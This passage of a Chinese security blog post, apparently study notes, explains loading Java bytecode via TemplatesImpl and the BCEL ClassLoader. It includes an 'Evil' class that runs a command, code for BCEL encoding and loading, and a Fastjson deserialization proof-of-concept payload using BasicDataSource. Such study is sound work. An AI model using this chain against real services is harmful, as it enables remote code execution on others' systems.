com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTemplatesImplDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span></span><br><span class="line"><span class="function"><span class="params">                          SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTemplatesImplDemo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"Hello TemplatesImpl"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它继承<code>AbstractTranslet</code>类，并在构造函数里插入了Hello的输出，将这个类编译成字节码，即可被TemplatesImpl执行。具体操作，先javac编译，然后读入.class文件，base64编码一下，复制到上面的demo中就可以用了。<br><img src="https://i.loli.net/2021/11/30/e1z5gRXT6S29u8U.png" alt="1.png"><br>在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影，这个系列后文中仍然会再次见到它的身影。</p>
+<h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><p>在这篇文章第一节中，P师傅说所有能够恢复能一个类并在JVM虚拟机加载的字节序列，都在探讨范围内。所以bcel字节码也在讨论范围内，并且占据着比较重要的地位。BCEL的全名是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的<strong>原生库</strong>中(位于com.sun.org.apache.bcel)。关于BCEL的详细介绍，P师傅专门出了一篇文<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" target="_blank" rel="noopener">传送门</a>，一定要看这篇分析。根据P师傅的分析，JDK会将BCEL放到自己的代码主要是为了支撑Java XML相关功能。</p>
+<h3 id="BCEL-ClassLoader如何使用"><a href="#BCEL-ClassLoader如何使用" class="headerlink" title="BCEL ClassLoader如何使用"></a>BCEL ClassLoader如何使用</h3><p>BCEL这个包有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，这是一个ClassLoader，但是它重写了Java内置的ClassLoader#loadClass()方法。在ClassLoader#loadClass()中，会判断类名是否以<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行decode。可以编写一个恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后将Evil生成BCEL形式的字节码，使用这个字节码来新建对象，将会调用到计算器。这里需要注意一下JDK的版本。不能用Java 8u251之后的版本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloBCEL</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JavaClass cls = Repository.lookupClass(Evil<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        String code = Utility.encode(cls.getBytes(), <span class="keyword">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="keyword">new</span> ClassLoader().loadClass(<span class="string">"$$BCEL$$"</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="BCEL在Fastjson漏洞中的利用"><a href="#BCEL在Fastjson漏洞中的利用" class="headerlink" title="BCEL在Fastjson漏洞中的利用"></a>BCEL在Fastjson漏洞中的利用</h3><p>前面P师傅介绍了BCEL的来历和用法，实际攻防中，是怎么使用BCEL的呢？这个得追溯到Fastjson反序列化漏洞，当年Fastjson反序列化漏洞出现后，网络上广泛流传的利用链有下面三个：</p>
+<ul>
+<li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</li>
+<li>com.sun.rowset.JdbcRowSetImpl</li>
+<li>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li>
+</ul>
+<p>第一个利用链就是常规的字节码执行，但是需要开启Feature.SupportNonPbulicField,比较鸡肋。第二个利用链用到的是JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，在目标没外网的情况下无法直接利用。第三个利用链也是字节码的利用，但是无需目标开启额外选项，也不需要连接外部服务器，利用条件更低。BasicDataSource的利用原理可以参考这篇文章<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener">传送门</a>,这里p师傅也只做了一个简单的描述。BasicDataSource的toString方法会遍历这个类所有的getter并执行，于是通过getConnection()–&gt;createDataSource()–&gt;createConnectionFactory()的调用关系，调用到了createConnectionFactory方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ConnectionFactory <span class="title">createConnectionFactory</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="comment">// Load the JDBC driver class</span></span><br><span class="line">        Driver driverToUse = <span class="keyword">this</span>.driver;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (driverToUse == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; driverFromCCL = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (driverClassName != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (driverClassLoader == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(</span><br><span class="line">                                    driverClassName, <span class="keyword">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br><span class="line">                        ...</span><br></pre></td></tr></table></figure>
+<p>在createConnectionFactory方法中，调用了<code>Class.forName(driverClassName, true, driverClassLoader)</code>，这里第二个参数为true时，类加载后会直接执行static{}块中的代码。因为driverClassLoader和driveClassLoader都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可。BCEL ClassLoader登场。前面已经演示过怎么用BCEL加载字节码并执行命令。这里只是将前面的loadClass变成了Class.forName.综上，构造一个Fastjson的poc如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;aaa&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;bbb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样在Fastjson解析poc的时候就可以触发反序列化命令执行。</p>
+<h3 id="BCEL去哪了"><a href="#BCEL去哪了" class="headerlink" title="BCEL去哪了"></a>BCEL去哪了</h3><p>如果在Java 8u261下执行，会抛出一个异常，原因是com.sun.org.apache.bcel.internal.util.ClassLoader这个类不在了。很遗憾，在Java 8u251以后，BCEL这个安全人员的好伙伴就此离家出走了，不知道何时会归来。所以，之后测试fastjson反序列化，记得这里有个坑。</p>
+<hr>
+<p>回到正文，继续介绍BCEL加载字节码。可以通过BCEL提供的两个类Repository和Utility来利用。Repository用于将一个Java Class先转换成原生字节码，这里也可以使用javac来编译java文件生成字节码。Utility用于将原生的字节码转换成BCEL格式的字节码,这里其实在前面的BCEL如何使用部分已经举过例子，刷上去看看就懂了。BCEL ClassLoader在Fastjson等漏洞利用链构造的时候都有被用到，其实这个类和前面的TemplatesImpl都出自同一个第三方库Apache Xalan。但是由于在Java 8u251之后，这个ClassLoader被移除，之后只能且用且珍惜了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/27/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-ysoserial-CC6-%E7%AE%80%E5%8D%95%E8%B0%83%E8%AF%95/" rel="next" title="Java安全漫谈-ysoserial-CC6-简单调试">
+                <i class="fa fa-chevron-left"></i> Java安全漫谈-ysoserial-CC6-简单调试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是Java的字节码"><span class="nav-number">1.</span> <span class="nav-text">什么是Java的字节码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用URLClassLoader加载远程class文件"><span class="nav-number">2.</span> <span class="nav-text">利用URLClassLoader加载远程class文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用ClassLoader-defineClass直接加载字节码"><span class="nav-number">3.</span> <span class="nav-text">利用ClassLoader#defineClass直接加载字节码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用TemplatesImpl加载字节码"><span class="nav-number">4.</span> <span class="nav-text">利用TemplatesImpl加载字节码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用BCEL-ClassLoader加载字节码"><span class="nav-number">5.</span> <span class="nav-text">利用BCEL ClassLoader加载字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL-ClassLoader如何使用"><span class="nav-number">5.1.</span> <span class="nav-text">BCEL ClassLoader如何使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL在Fastjson漏洞中的利用"><span class="nav-number">5.2.</span> <span class="nav-text">BCEL在Fastjson漏洞中的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL去哪了"><span class="nav-number">5.3.</span> <span class="nav-text">BCEL去哪了</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">183.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
